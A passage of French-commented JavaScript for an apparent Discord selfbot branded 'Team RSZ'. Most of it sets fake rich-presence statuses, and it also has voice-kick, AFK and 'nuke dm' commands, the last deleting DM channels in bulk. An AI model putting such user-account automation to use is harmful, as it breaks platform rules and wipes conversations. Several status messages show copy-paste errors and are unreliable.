  if (!message.guild.me.hasPermission('MOVE_MEMBERS')) return message.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
  const member = message.mentions.members.first();
  if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
  if (!member.voiceChannel) return message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**');
  member.setVoiceChannel(null).catch(error => 
    message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**')
    );
  message.edit(":white_check_mark: **L'utilisateur a été voice kick correctement**")
  console.log("╟ Commande voice kick executé")
  console.log("╟─────────────────────────────────╢")
};
	if(message.content.startsWith(prefix + "afk")){
	let raison = args.splice(1).join(" ") || "pas de raison";
		afk[client.user.id] = {
			activé: "oui",
			r: raison
		  };
		  saving();
		  message.edit(":white_check_mark: **Vous etes afk pour** " + raison)
      console.log("╟ Commande afk executé")
      console.log("╟─────────────────────────────────╢")
  };
	if(message.content.startsWith(prefix + "gucci")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "gucci")
      .then(image => {
        rpcGenerator.getRpcImage("603405368940429315", "gucci0")
      .then(image2 => {
          let presence = new rpcGenerator.Rpc()
              .setName("Gucci")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Gucci')
              .setAssetsLargeImage(image.id)
              .setAssetsSmallImage(image2.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Comande Gucci executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Gucci**`);
                })
              })
            }
    if(message.content.startsWith(prefix + "lacoste")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "lacoste")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Lacoste")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Lacoste')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Lacoste executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur lacoste**`);
                })
              }
    if(message.content.startsWith(prefix + "nike")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "nike")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Nike")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Nike')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Nike executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Nike**`);
                })
              }
    if(message.content.startsWith(prefix + "google")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "google")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Google")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Google')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande google executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur google**`);
                })
              }
    if(message.content.startsWith(prefix + "skype")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "skype")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Skype")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Skype')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Skype executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Skype**`);
                })
              }
    if(message.content.startsWith(prefix + "snapchat")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "snapchat")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Snapchat")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Snapchat')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Snapchat executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Snapchat**`);
                })
              }
    if(message.content.startsWith(prefix + "facebook")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "facebook")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Facebook")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Skype')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Facebook executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Facebook**`);
                })
              }
    if(message.content.startsWith(prefix + "nuke dm")){
      let zbi = ""
                    message.edit("**Nuking dms...**")
                    client.users.forEach(user => 
                      user.deleteDM().catch(zbi = "zebi")
                    )
                    message.edit(":white_check_mark: **Nuked dms**")
                    console.log("╟ Commande nuke dm executé")
                    console.log("╟─────────────────────────────────╢")
                  }
    if(message.content.startsWith(prefix + "tiktok")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "tiktok")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Tiktok")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Tiktok')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande tiktok executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Tiktok**`);
                })
              }
    if(message.content.startsWith(prefix + "twitter")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "twitter")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Twitter")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Twitter')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande twitter executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Twitter**`);
                })
              }
    if(message.content.startsWith(prefix + "instagram")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "instagram")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Instagram")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Instagram')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande instagram executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Instagram**`);
                })
              }
    if(message.content.startsWith(prefix + "youtube")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "youtube")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Youtube")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Youtube')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande youtube executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Youtube**`);
                })
              }
    if(message.content.startsWith(prefix + "tokyo ghoul")){
      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "tokyo")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Tokyo Ghoul")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Tokyo Ghoul')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande tokyo ghoul executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Tokyo Ghoul**`);
                })
              }
    if(message.content.startsWith(prefix + "hunter x hunter")){
      let argument = args.splice(3).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "hxh")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Hunter X Hunter")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Hunter X Hunter')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Hunter X Hunter executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Hunter X Hunter**`);
                })
              }
    if(message.content.startsWith(prefix + "naruto")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "naruto")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Naruto")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Naruto')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Naruto executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Naruto**`);
                })
              }
    if(message.content.startsWith(prefix + "pornhub")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "pornhub")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Pornhub")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("WATCHING")
              .setApplicationId("603405368940429315")
              .setDetails('Pornhub')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())

              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Pornhub executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Pornhub**`);
                })
              }
              if(message.content.startsWith(prefix + "clash of clan")){
                let argument = args.splice(3).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                rpcGenerator.getRpcImage("721465320740487179", "clash-of-clans-app-icon")
                .then(image => {
                    let presence = new rpcGenerator.Rpc()
                        .setName("Clash Of Clan")
                        .setUrl('https://www.twitch.tv/codezero_two_')
                        .setType("PLAYING")
                        .setApplicationId("721465320740487179")
                        .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                        .setAssetsLargeImage(image.id)
                        .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                        .setState(argument)
                        .setStartTimestamp(Date.now())
              
                        .setParty({
                            id: uuid()
                            })
                            client.user.setPresence(presence.toDiscord()).catch(console.error);
                            console.log("╟ Commande Clash Of Clan")
                            console.log("╟─────────────────────────────────╢")
                            message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Of Clan**`);
                          })
                        }
                        if(message.content.startsWith(prefix + "minecraft")){
                          let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                          rpcGenerator.getRpcImage("603405368940429315", "minecraft")
                          .then(image => {
                              let presence = new rpcGenerator.Rpc()
                                  .setName("Minecraft")
                                  .setUrl('https://www.twitch.tv/codezero_two_')
                                  .setType("PLAYING")
                                  .setApplicationId("603405368940429315")
                                  .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                  .setAssetsLargeImage(image.id)
                                  .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                  .setState(argument)
                                  .setStartTimestamp(Date.now())
                        
                                  .setParty({
                                      id: uuid()
                                      })
                                      client.user.setPresence(presence.toDiscord()).catch(console.error);
                                      console.log("╟ Commande minecraft executé")
                                      console.log("╟─────────────────────────────────╢")
                                      message.edit(`:white_check_mark: **Tu joues à ${argument} sur Minecraft**`);
                                    })
                                  }
              if(message.content.startsWith(prefix + "clash royal")){
                let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                rpcGenerator.getRpcImage("603405368940429315", "clashroyal")
                .then(image => {
                    let presence = new rpcGenerator.Rpc()
                        .setName("Clash Royal")
                        .setUrl('https://www.twitch.tv/codezero_two_')
                        .setType("PLAYING")
                        .setApplicationId("603405368940429315")
                        .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                        .setAssetsLargeImage(image.id)
                        .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                        .setState(argument)
                        .setStartTimestamp(Date.now())
              
                        .setParty({
                            id: uuid()
                            })
                            client.user.setPresence(presence.toDiscord()).catch(console.error);
                            console.log("╟ Commande clash royal")
                            console.log("╟─────────────────────────────────╢")
                            message.edit(`:white_check_mark: **Tu joues à ${argument} sur Clash Royal**`);
                          })
                        }
    if(message.content.startsWith(prefix + "tinder")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "tinder")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Tinder")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande tinder executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Tinder**`);
                })
              }
    if(message.content.startsWith(prefix + "roblox")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "roblox")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Roblox")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande roblox")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Roblox**`);
                })
              }
    if(message.content.startsWith(prefix + "badlion")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "badlion")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Badlion")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Badlion")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Badlion**`);
                })
              }
    if(message.content.startsWith(prefix + "apex")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "apex")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Apex Legends")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande apex legends executé")
                  console.log("╟─────────────────────────────────╢") 
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Apex Legends**`);
                })
              }
    if(message.content.startsWith(prefix + "csgo")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "csgo")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Counter Strike")
              .setUrl('https://www.twitch.tv/hml_cp0')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande csgo")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur csgo**`);
                })
              }
    if(message.content.startsWith(prefix + "among us")){
      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "amongus")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Among us")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande Among Us executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur among us**`);
                })
              }
    if(message.content.startsWith(prefix + "fortnite")){
      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "fortnite")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Fortnite")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("PLAYING")
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Comande Fortnite executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur fortnite**`);
                })
              }
    if(message.content.startsWith(prefix + "rocket league")){
      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
      rpcGenerator.getRpcImage("603405368940429315", "rocket_league")
      .then(image => {
          let presence = new rpcGenerator.Rpc()
              .setName("Rocket League")
              .setUrl('https://www.twitch.tv/codezero_two_')
              .setType("PLAYING")
              .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
              .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
              .setApplicationId("603405368940429315")
              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
              .setAssetsLargeImage(image.id)
              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
              .setState(argument)
              .setStartTimestamp(Date.now())
    
              .setParty({
                  id: uuid()
                  })
                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                  console.log("╟ Commande rocket league executé")
                  console.log("╟─────────────────────────────────╢")
                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur rocket league**`);
                })
              }



///////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////
if(message.content.startsWith(prefix + "snk")){
  let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
  rpcGenerator.getRpcImage("862468524390613026", "snk")
  .then(image => {
      let presence = new rpcGenerator.Rpc()
          .setName("Shingeki No Kyojin")
          .setUrl('https://www.twitch.tv/codezero_two_')
          .setType("WATCHING")
          .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
          .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
          .setApplicationId("862468524390613026")
          .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
          .setAssetsLargeImage(image.id)
          .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
          .setState(argument)
          .setStartTimestamp(Date.now())

          .setParty({
              id: uuid()
              })
              client.user.setPresence(presence.toDiscord()).catch(console.error);
              console.log("╟ Commande Shingeki No Kyojin executé")
              console.log("╟─────────────────────────────────╢")
              message.edit(`:white_check_mark: **Tu regardes ${argument} sur rocket league**`);
            })
          }
          if(message.content.startsWith(prefix + "ditf")){
            let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
            rpcGenerator.getRpcImage("862468524390613026", "ditf")
            .then(image => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Darling in the FranXX")
                    .setUrl('https://www.twitch.tv/codezero_two_')
                    .setType("WATCHING")
                    .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                    .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                    .setApplicationId("862468524390613026")
                    .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                    .setState(argument)
                    .setStartTimestamp(Date.now())
          
                    .setParty({
                        id: uuid()
                        })
                        client.user.setPresence(presence.toDiscord()).catch(console.error);
                        console.log("╟ Commande Darling in the FranXX executé")
                        console.log("╟─────────────────────────────────╢")
                        message.edit(`:white_check_mark: **Tu regardes ${argument} sur Darling in the FranXX**`);
                      })
                    }

                    if(message.content.startsWith(prefix + "death note")){
                      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                      rpcGenerator.getRpcImage("862468524390613026", "dn")
                      .then(image => {
                          let presence = new rpcGenerator.Rpc()
                              .setName("Death Note")
                              .setUrl('https://www.twitch.tv/codezero_two_')
                              .setType("WATCHING")
                              .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                              .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                              .setApplicationId("862468524390613026")
                              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                              .setAssetsLargeImage(image.id)
                              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                              .setState(argument)
                              .setStartTimestamp(Date.now())
                    
                              .setParty({
                                  id: uuid()
                                  })
                                  client.user.setPresence(presence.toDiscord()).catch(console.error);
                                  console.log("╟ Commande Death Note executé")
                                  console.log("╟─────────────────────────────────╢")
                                  message.edit(`:white_check_mark: **Tu regardes ${argument} sur Death Note**`);
                                })
                              }

                              if(message.content.startsWith(prefix + "assassination classroom")){
                                let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                rpcGenerator.getRpcImage("862468524390613026", "ac")
                                .then(image => {
                                    let presence = new rpcGenerator.Rpc()
                                        .setName("Assassination Classroom")
                                        .setUrl('https://www.twitch.tv/codezero_two_')
                                        .setType("WATCHING")
                                        .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                        .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                        .setApplicationId("862468524390613026")
                                        .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                        .setAssetsLargeImage(image.id)
                                        .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                        .setState(argument)
                                        .setStartTimestamp(Date.now())
                              
                                        .setParty({
                                            id: uuid()
                                            })
                                            client.user.setPresence(presence.toDiscord()).catch(console.error);
                                            console.log("╟ Commande Assassination Classroom executé")
                                            console.log("╟─────────────────────────────────╢")
                                            message.edit(`:white_check_mark: **Tu regardes ${argument} sur Death Note**`);
                                          })
                                        }

                                        
                                        if(message.content.startsWith(prefix + "mha")){
                                          let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                          rpcGenerator.getRpcImage("862468524390613026", "mha")
                                          .then(image => {
                                              let presence = new rpcGenerator.Rpc()
                                                  .setName("My Hero Academia")
                                                  .setUrl('https://www.twitch.tv/codezero_two_')
                                                  .setType("WATCHING")
